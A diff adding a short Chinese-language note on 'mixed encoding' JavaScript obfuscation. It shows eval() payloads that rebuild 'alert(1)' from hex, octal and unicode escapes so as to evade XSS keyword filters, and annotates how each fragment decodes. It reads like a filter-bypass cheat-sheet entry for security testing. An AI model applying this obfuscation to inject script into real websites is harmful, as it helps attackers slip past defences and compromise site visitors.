@@ -1,0 +1,15 @@
+混合编码
+<script type="text/javascript">
+eval(RegExp('\x5c\x75\x30\x30\x36\x31').source+String.fromCharCode(0154)+'\\u00'+0x41+/\u0072/.exec('\x72')+'\134u0074'+'(1)')
+
+//对上一条语句里的exec部分进一步unicode编码，其他部分亦可同样处理：
+eval(RegExp('\x5c\x75\x30\x30\x36\x31').source+String.fromCharCode(0154)+'\\u00'+0x41+/\u0072/.\u0065\u0078\u0065\u0063('\x72')+'\134u0074'+'(1)')
+
+</script>
+
+备注：
+1. RegExp('\x5c\x75\x30\x30\x36\x31').source => "\u0061" a的unicode编码
+2. String.fromCharCode(0154) 得到 “l” 字符
+3. '\\u00'+0x41 => "\\u0065" =>"e" 字符
+4. /\u0072/.exec('\x72') => "r" 字符
+5. '\134u0074' => "134"是八进制的表达，对应的字符是"\"，所以整个是"\\u0074"，对应回"t"
